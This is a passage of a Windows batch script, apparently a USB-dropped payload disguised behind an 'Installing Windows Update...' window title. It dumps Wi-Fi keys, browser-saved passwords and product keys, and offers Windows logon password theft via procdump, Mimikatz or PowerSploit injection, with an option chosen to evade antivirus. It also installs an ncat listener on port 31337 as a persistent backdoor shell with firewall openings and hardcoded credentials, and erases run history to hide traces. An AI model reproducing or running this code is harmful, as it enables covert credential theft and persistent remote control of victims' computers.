if "%CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL%"=="TRUE" call :DT_Write_Log "[PASS/PROG] Service installed. Installing firewall entry..." & netsh firewall add allowedprogram "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_NCAT_EXECUTABLE%" %CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_NAME% ENABLE & netsh firewall add portopening TCP %CON_DT_NETCAT_LISTEN_PORT% %CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_PORT_TCP_NAME%
if "%CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL%"=="TRUE" call :DT_Write_Log "[PASS] Firewall entry should now be installed."
call :DT_Write_Log "[PROG] Starting NetCat service..."
SC START NCAT >nul
call :DT_Write_Log "[PASS] NetCat service should now be running."
goto DT_The_End_Of_Time
:DT_Install_NetCat_Update_Components
call :DT_Write_Log "[PROG] Updating NetCat components %CON_DT_NETCAT_SERVICE_PROGRAM% and %CON_DT_NETCAT_LISTEN_PROGRAM%... This version of Terminal.bat uses a hash algorithm so your configuration file might be deleted. Default User: Lavanoid. Default Pass: LavanoidVolcanic."
call :DT_Write_Log "[PROG] Killing service..."
TASKKILL /F /IM %CON_DT_NETCAT_NCAT_EXECUTABLE% >nul
call :DT_Write_Log "[PASS/PROG] Service should now be killed. Copying required information..."
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\1.6_Installed.dat" del /f "%CON_DT_NETCAT_COPY_TO_PATH%\login_conf.dat"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_LISTEN_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_NETCAT_LISTEN_PROGRAM%. NetCat update aborted." & goto DT_The_End_Of_Time
copy /y "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_LISTEN_PROGRAM%" "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_LISTEN_PROGRAM%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_SERVICE_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_NETCAT_SERVICE_PROGRAM%. NetCat update aborted." & goto DT_The_End_Of_Time
copy /y "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_SERVICE_PROGRAM%" "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%" >nul
@echo "%CON_DT_NETCAT_NCAT_EXECUTABLE%" -l -p %CON_DT_NETCAT_LISTEN_PORT% -vv -k -e %CON_DT_NETCAT_LISTEN_PROGRAM% >> "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%"
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to copy %CON_DT_NETCAT_SERVICE_PROGRAM% to %CON_DT_NETCAT_COPY_TO_PATH%. NetCat updte aborted." & goto DT_The_End_Of_Time
@echo. > "%CON_DT_NETCAT_COPY_TO_PATH%\1.6_Installed.dat"
call :DT_Write_Log "[PASS/PROG] Components updated. Starting service..."
SC START NCAT >nul
call :DT_Write_Log "[PASS] Service should be running now. NetCat update complete."
goto DT_The_End_Of_Time
:DT_Call_Init_Scripts
call :DT_Write_Log "[PROG] Executing Init scripts..."
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%" call :DT_Write_Log "[FAIL] Init script[s] execution failed. Error reason: The directory %CON_DT_INIT_SCRIPTS_DIRECTORY% does not exist." & set DT_VAR_ERROR_EXIT=TRUE&goto DT_The_End_Of_Time
set DT_Init_Current=0
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" call :DT_Write_Log "[PROG] Init script %DT_Init_Current%.bat located. Executing..." & call "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" & call :DT_Write_Log "[PASS] Init script %DT_Init_Current%.bat executed."
%~d0
CD %~dp0
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" call :DT_Write_Log "[FAIL] Init script %DT_Init_Current%.bat not located. Skipping init execution..." & goto DT_The_End_Of_Time
:DT_Init_Script_Execution_Count
set DT_Init_Current=%DT_Init_Current%+1
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" call :DT_Write_Log "[PROG] Init script %DT_Init_Current%.bat located. Executing..." & call "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" & call :DT_Write_Log "[PASS] Init script %DT_Init_Current%.bat executed."
%~d0
CD %~dp0
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" goto DT_The_End_Of_Time
goto DT_The_End_Of_Time
:DT_Backup_Workgroups_And_Domains
call :DT_Write_Log "[PROG] Backing up workgroup and domain listings..."
NET VIEW /DOMAIN >> "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%\%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE%"
if not exist "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%\%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE%" call :DT_Write_Log "[FAIL] Backup of workgroup and domain listings failed." & set DT_VAR_ERROR_EXIT=TRUE&goto DT_The_End_Of_Time
if not exist "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%\%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE%" call :DT_Write_Log "[PASS] Backup of workgroup and domain listings successfull."
goto DT_The_End_Of_Time
:DT_Backup_Directory_Listings
call :DT_Write_Log "[PROG] Backing up directory listings..."
if exist "%ProgramFiles% (x86)" dir "%ProgramFiles% (x86)" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\ProgramFiles_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if not "%ProgramFiles%"=="C:\Program Files" dir "%ProgramFiles%" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\ProgramFiles2_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if "%ProgramFiles%"=="C:\Program Files" dir "%ProgramFiles%" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\ProgramFiles_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\ProgramFiles_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%" call :DT_Write_Log "[PASS] Backup directory listings complete."
if not exist "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\ProgramFiles_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%" call :DT_Write_Log "[FAIL] Unable to backup directory listings." & set DT_VAR_ERROR_EXIT=TRUE&goto DT_The_End_Of_Time
if exist "%USERPROFILE%\Music" dir "%USERPROFILE%\Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Music" dir "%USERPROFILE%\My Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Documents" dir "%USERPROFILE%\Documents" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents" dir "%USERPROFILE%\My Documents" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Pictures" dir "%USERPROFILE%\Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Pictures" dir "%USERPROFILE%\My Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Downloads" dir "%USERPROFILE%\Downloads" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Downloads_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Download" dir "%USERPROFILE%\Download" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Download_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Download" dir "%USERPROFILE%\My Download" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Download_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Downloads" dir "%USERPROFILE%\My Downloads" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Downloads_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Music" dir "%USERPROFILE%\My Documents\Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Music" dir "%USERPROFILE%\My Documents\My Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Pictures" dir "%USERPROFILE%\My Documents\My Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Pictures" dir "%USERPROFILE%\My Documents\Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Videos" dir "%USERPROFILE%\My Documents\My Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Videos" dir "%USERPROFILE%\My Documents\Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Downloads" dir "%USERPROFILE%\My Documents\Downloads" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Downloads_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Download" dir "%USERPROFILE%\My Documents\Download" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Download_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%" dir "%USERPROFILE%" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\%USERNAME%_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
goto DT_The_End_Of_Time
:DT_Backup_Variable_Listings
call :DT_Write_Log "[PROG] Backing up variable listings..."
set >> "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%\%CON_DT_BACKUP_VARIABLE_LISTINGS_FILE%"
if not exist "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%\%CON_DT_BACKUP_VARIABLE_LISTINGS_FILE%" call :DT_Write_Log "[FAIL] Failed to backup variable listings. Backup aborted."  & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
if exist "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%\%CON_DT_BACKUP_VARIABLE_LISTINGS_FILE%" call :DT_Write_Log "[PASS] Successfully backed up variable listings."
goto DT_The_End_Of_Time
:DT_Backup_Product_Keys
call :DT_Write_Log "[PROG] Backing up product keys..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" call :DT_Write_Log "[FAIL] Failed to locate Wind.zip so the backup was aborted." & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
call :DT_Extract_Archive "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" "%CON_DT_RES_DIRECTORY_ROOT%\Wind\" "%CON_PROGRAM_ARCHIVE_PASSWORD%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" call :DT_Write_Log "[FAIL] Failed to extract Wind.zip so the backup was aborted." & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" >> "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_FILE%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe"
if not exist "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_FILE%" call :DT_Write_Log "[FAIL] Failed to backup product keys. Backup aborted." & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
call :DT_Write_Log "[PASS] Backup of product keys complete."
goto DT_The_End_Of_Time
:DT_Backup_WiFi_Passwords
netsh wlan export profile key=clear folder="%CON_DT_BACKUP_WIFI_KEYS_PATH%" >nul
goto DT_The_End_Of_Time
:DT_Backup_Saved_Passwords
call :DT_Write_Log "[PROG] Backing up saved browser passwords..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.zip" call :DT_Write_Log "[FAIL] Failed to locate WebBrowserPassView.zip so the backup was aborted." & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
call :DT_Extract_Archive "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.zip" "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\" "%CON_PROGRAM_ARCHIVE_PASSWORD%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.exe" call :DT_Write_Log "[FAIL] Failed to extract WebBrowserPassView.zip so the backup was aborted." & set DT_VAR_ERROR_EXIT=TRUE& goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.exe" /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /LoadPasswordsSafari 1 /stext "%CON_DT_BACKUP_SAVED_PASSWORDS_PATH%\%CON_DT_BACKUP_SAVED_PASSWORDS_FILE%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\WebBrowserPassView\WebBrowserPassView.exe"
call :DT_Write_Log "[PASS] Backup of browser passwords complete."
goto DT_The_End_Of_Time
:DT_Determine_System
set VAR_DT_SYSTEM_ARCHITECTURE=32BIT
if exist "%SystemRoot%\SysWOW64" set VAR_DT_SYSTEM_ARCHITECTURE=64BIT
call :DT_Write_Log "Determined system architecture: %VAR_DT_SYSTEM_ARCHITECTURE%"
goto DT_The_End_Of_Time
:DT_Extract_Archive
set VAR_DT_ARCHIVE=
set VAR_DT_ARCHIVE=%1
set VAR_DT_ARCHIVE=%VAR_DT_ARCHIVE:"=%
if "%VAR_DT_ARCHIVE%"=="" goto DT_The_End_Of_Time
set VAR_DT_ARCHIVE_OUTPUT_DIR=
set VAR_DT_ARCHIVE_OUTPUT_DIR=%2
set VAR_DT_ARCHIVE_OUTPUT_DIR=%VAR_DT_ARCHIVE_OUTPUT_DIR:"=%
if "%VAR_DT_ARCHIVE_OUTPUT_DIR%"=="" goto DT_The_End_Of_Time
set VAR_DT_ARCHIVE_PASSWORD=
set VAR_DT_ARCHIVE_PASSWORD=%3
set VAR_DT_ARCHIVE_PASSWORD=%VAR_DT_ARCHIVE_PASSWORD:"=%
if "%VAR_DT_ARCHIVE_PASSWORD%"=="" goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%VAR_DT_ARCHIVE_OUTPUT_DIR%" -y "%VAR_DT_ARCHIVE%" -p"%VAR_DT_ARCHIVE_PASSWORD%" >nul
set VAR_DT_ARCHIVE_PASSWORD=
set VAR_DT_ARCHIVE=
set VAR_DT_ARCHIVE_OUTPUT_DIR=
goto DT_The_End_Of_Time
:DT_API_CALL
set DT_VAR_API_CALL=
set DT_VAR_API_CALL=%1
set DT_VAR_API_CALL=%DT_VAR_API_CALL:"=%
if "%DT_VAR_API_CALL%"=="" goto DT_The_End_Of_Time
call :DT_Write_Log "[PROG] Calling API %DT_VAR_API_CALL%..."
if not exist "%CON_DT_API_DIRECTORY%\%DT_VAR_API_CALL%.bat" call :DT_Write_Log "[FAIL] Failed to call requrested API. API not installed."
if exist "%CON_DT_API_DIRECTORY%\%DT_VAR_API_CALL%.bat" call "%CON_DT_API_DIRECTORY%\%DT_VAR_API_CALL%.bat"
if exist "%CON_DT_API_DIRECTORY%\%DT_VAR_API_CALL%.bat" call :DT_Write_Log "[PASS] API %DT_VAR_API_CALL% called."
set DT_VAR_API_CALL=
goto DT_The_End_Of_Time
:DT_Set_Program_Title_Default
Title = %CON_WINDOW_TITLE%
goto DT_The_End_Of_Time
:DT_Set_Program_CLI_Default
cls
%CON_WINDOW_CLI%
goto DT_The_End_Of_Time
:DT_Write_Log
if not "%CON_DT_LOG%"=="TRUE" goto DT_The_End_Of_Time
set DT_VAR_WRITE_LOG=
set DT_VAR_WRITE_LOG=%1
set DT_VAR_WRITE_LOG=%DT_VAR_WRITE_LOG:"=%
@echo [%DATE%-%TIME%] %DT_VAR_WRITE_LOG% >> "%CON_DT_LOGFILE%"
goto DT_The_End_Of_Time
:DT_Create_Required_Directories
if not exist "%CON_DT_API_DIRECTORY%" mkdir "%CON_DT_API_DIRECTORY%"
if not exist "%CON_DT_BKD%" mkdir "%CON_DT_BKD%"
if not exist "%CON_DT_BKD_MAIN%" mkdir "%CON_DT_BKD_MAIN%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%" mkdir "%CON_DT_RES_DIRECTORY_ROOT%"
if not exist "%CON_DT_BACKUP_WIFI_KEYS_PATH%" mkdir "%CON_DT_BACKUP_WIFI_KEYS_PATH%"
if not exist "%CON_DT_BACKUP_SAVED_PASSWORDS_PATH%" mkdir "%CON_DT_BACKUP_SAVED_PASSWORDS_PATH%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%" mkdir "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%"
if not exist "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%" mkdir "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%"
if not exist "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%" mkdir "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%"
if not exist "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%" mkdir "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%"
if not exist "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%" mkdir "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%"
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%" mkdir "%CON_DT_INIT_SCRIPTS_DIRECTORY%"
goto DT_The_End_Of_Time
:DT_Configuration_Read
REM "VAR_DT_VER" is the version of this program.
set VAR_DT_VER=2.5, rebuild 3 - Last updated on: 17 February 2014.
REM When "DT_DEBUGGING" is set to TRUE, echo will be set to "ON" and the script will pause when execution is complete.
set DT_DEBUGGING=FALSE
REM "VAR_DT_CWD" is the default CD. CWD stands for "Current Working Directory".
set VAR_DT_CWD=%CD%
REM When the variable "DT_CON_VERIFY_WRITTEN_FILES" is set to TRUE, cmd verifys that files are written to the disk correctly.
set DT_CON_VERIFY_WRITTEN_FILES=TRUE
REM "CON_PROGRAM_ARCHIVE_PASSWORD" is the default password for encrypted archives.
set CON_PROGRAM_ARCHIVE_PASSWORD=KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj
REM "CON_DT_BKD" is the directory where backups are stored.
set CON_DT_BKD=%VAR_DT_CWD%\Backups
REM "CON_DT_BKD_MAIN" is the directory where backups for the specific PC are stored.
set CON_DT_BKD_MAIN=%CON_DT_BKD%\%COMPUTERNAME%
REM "CON_DT_RES_DIRECTORY_ROOT" is the directory where the external programs are located.
set CON_DT_RES_DIRECTORY_ROOT=%VAR_DT_CWD%\Res
REM When "CON_DT_LOG" is set to TRUE, this program saves a log of its execution to the configured file.
set CON_DT_LOG=TRUE
REM "CON_DT_LOGFILE" is the setting for where logs are saved as.
set CON_DT_LOGFILE=%VAR_DT_CWD%\BackupLog.txt
REM When "CON_DT_CHECK_RES" is set to TRUE, the program executes the process of checking that the external programs integrity are correct and that they haven't been tampered with.
set CON_DT_CHECK_RES=FALSE
REM When "CON_DT_SOUNDPLAY_0" is set to true, the program will execute the configured sound file after the execution of everything else has completed. A total of 4 sounds can be configured.
set CON_DT_SOUNDPLAY_0=TRUE
set CON_DT_SOUNDWAVFILE_0=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\0\sound.wav
set CON_DT_SOUNDVBSFILE_0=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\0\sound.vbs
set CON_DT_SOUNDPLAY_1=FALSE
set CON_DT_SOUNDWAVFILE_1=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\1\sound.wav
set CON_DT_SOUNDVBSFILE_1=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\1\sound.vbs
set CON_DT_SOUNDPLAY_2=FALSE
set CON_DT_SOUNDWAVFILE_2=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\2\sound.wav
set CON_DT_SOUNDVBSFILE_2=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\2\sound.vbs
set CON_DT_SOUNDPLAY_3=FALSE
set CON_DT_SOUNDWAVFILE_3=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\3\sound.wav
set CON_DT_SOUNDVBSFILE_3=%CON_DT_RES_DIRECTORY_ROOT%\Res\Sounds\3\sound.vbs
set CON_DT_SOUNDPLAY_4=FALSE
set CON_DT_SOUNDWAVFILE_4=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\4\sound.wav
set CON_DT_SOUNDVBSFILE_4=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\4\sound.vbs
REM "CON_DT_AFTER_EXECUTION_COMMAND" declares what the program should do when everything has executed. The triggers for this variable are:
REM 0 - Do nothing
REM 1 - Lock workstation/system. The equivalent of pressing Win+L.
REM 2 - Power off the workstation/system.
REM 3 - Reboot workstation/system.
set CON_DT_AFTER_EXECUTION_COMMAND=0
REM The other variables below are self explanatory. Just read them yourself.
set CON_DT_BACKUP_WIFI_KEYS=TRUE
set CON_DT_BACKUP_WIFI_KEYS_PATH=%CON_DT_BKD_MAIN%\WiFi
set CON_DT_BACKUP_SAVED_PASSWORDS=TRUE
set CON_DT_BACKUP_SAVED_PASSWORDS_PATH=%CON_DT_BKD_MAIN%\Saved_Passwords
set CON_DT_BACKUP_SAVED_PASSWORDS_FILE=Browser_Passwords.txt
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS=TRUE
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH=%CON_DT_BKD_MAIN%\WinPass
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE=Windows_Passwords.txt
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP=Windows_Passwords.dmp
REM "CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD" declares how the program should backup Windows logon passwords. The triggers for this variable are:
REM 0 - Use procdump (Typically slow, but AV safe).
REM 1 - Use Mimikatz (Faster, but not AV safe and doesn't support Windows 8.1).
REM 2 - Use both procdump and Mimikatz.
REM 3 - Use PowerSploit Mimikatz RAM injection (Slow and requires a internet connection, but avoids AV).
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD=3
set CON_DT_BACKUP_PRODUCT_KEYS=TRUE
set CON_DT_BACKUP_PRODUCT_KEYS_PATH=%CON_DT_BKD_MAIN%\ProdKeys
set CON_DT_BACKUP_PRODUCT_KEYS_FILE=Product_Keys.txt
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY=FALSE
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH=%CON_DT_BKD_MAIN%\ProdKeys
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE=Produkey_Keys.txt
set CON_DT_BACKUP_DIRECTORY_LISTINGS=TRUE
set CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH=%CON_DT_BKD_MAIN%\DirListings
set CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE=Directory_Listings.txt
set CON_DT_BACKUP_VARIABLE_LISTINGS=TRUE
set CON_DT_BACKUP_VARIABLE_LISTINGS_PATH=%CON_DT_BKD_MAIN%\VarListings
set CON_DT_BACKUP_VARIABLE_LISTINGS_FILE=Variable_Listings.txt
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS=TRUE
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH=%CON_DT_BKD_MAIN%\Other
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE=Domains.N.Workgroups.txt
set CON_DT_MESSAGE_SHOW_AFTER_EXECUTION=FALSE
set CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_MESSAGE=Execution complete!
set CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_TITLE=Status!
set CON_DT_CHANGE_ADMIN_PASSWORD=FALSE
set CON_DT_CHANGE_ADMIN_PASSWORD_TO=Hak5_Admin_Password
set CON_DT_API_DIRECTORY=%CON_DT_RES_DIRECTORY_ROOT%\API
set CON_DT_INIT_USE_SCRIPTS=TRUE
set CON_DT_INIT_SCRIPTS_DIRECTORY=%VAR_DT_CWD%\Init
REM The variable "CON_DT_CLEANUP_SCRIPT" defines what files should be deleted when the program has executed.
set CON_DT_CLEANUP_SCRIPT=del /f "%VAR_DT_CWD%\invis.vbs" ^& del /f "%TEMP%\DS.bat" ^& del /f "%VAR_DT_CWD%\elevate.vbs"
REM When the variable "CON_DT_ERASE_RUN_HISTORY" is set to TRUE, the program clears the Windows run-history so there is no trace of this program ever being ran.
set CON_DT_ERASE_RUN_HISTORY=TRUE
REM When the variable "CON_DT_NETCAT_USE" is set to TRUE, NetCat gets installed into the "%SystemRoot%\nc" directory, then NetCat runs silently upon to boot of Windows. With NetCat running, you are able to execute commands from a remote computer. The default username for NCAT is: Lavanoid, and the default password is: LavanoidVolcanic.
set CON_DT_NETCAT_USE=TRUE
REM The variable "CON_DT_NETCAT_SERVICE_PROGRAM" defines what program is installed as a service.
set CON_DT_NETCAT_SERVICE_PROGRAM=Netcat_Script.bat
REM The variable "CON_DT_NETCAT_NCAT_EXECUTABLE" defines what and where the NetCat executable is.
set CON_DT_NETCAT_NCAT_EXECUTABLE=ncat.exe
REM The variable "CON_DT_NETCAT_LISTEN_PORT" defines what port NetCat should listen on.
set CON_DT_NETCAT_LISTEN_PORT=31337
REM The variable "CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL" determines if a firewall entry for NetCat should be installed.
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL=TRUE
REM The two variables below determine the names of the firewall entries.
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_NAME=NCAT
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_PORT_TCP_NAME=NCATTCP
REM The variable "CON_DT_NETCAT_LISTEN_PROGRAM" determines what program should be executed by NetCat when a client connects.
set CON_DT_NETCAT_LISTEN_PROGRAM=Terminal.bat
REM The variable "CON_DT_NETCAT_LISTEN_PROGRAM_UPDATE" determines if the program should update the Terminal.bat and Netcat_Script.bat for NetCat.
set CON_DT_NETCAT_LISTEN_PROGRAM_UPDATE=TRUE
REM The variable "CON_DT_NETCAT_COPY_TO_PATH" defines where NetCat should be installed.
set CON_DT_NETCAT_COPY_TO_PATH=%SystemRoot%\nc
REM The variable "CON_CONFIGURATION_FILE" defines the location of the configuration file.
set CON_CONFIGURATION_FILE=%VAR_DT_CWD%\DT_Configuration.ini
REM The variable "CON_WINDOW_TITLE" defines the program title.
set CON_WINDOW_TITLE=Installing Windows Update...
REM The variable "CON_WINDOW_CLI" defines the default layout of the program window.
set CON_WINDOW_CLI=COLOR F0 ^& @echo %CON_WINDOW_TITLE%
REM When the variable "CON_DT_UNMOUNT_USB_STORAGE" is set to TRUE, the script unmounts the storage device that it is located on.
set CON_DT_UNMOUNT_USB_STORAGE=FALSE
if exist "%TEMP%\DT_Config.bat" del /f "%TEMP%\DT_Config.bat" >nul
if exist "%CON_CONFIGURATION_FILE%" copy /Y /V "%CON_CONFIGURATION_FILE%" "%TEMP%\DT_Config.bat" >nul
if exist "%TEMP%\DT_Config.bat" call "%TEMP%\DT_Config.bat" >nul
if exist "%TEMP%\DT_Config.bat" del /f "%TEMP%\DT_Config.bat" >nul
goto DT_The_End_Of_Time
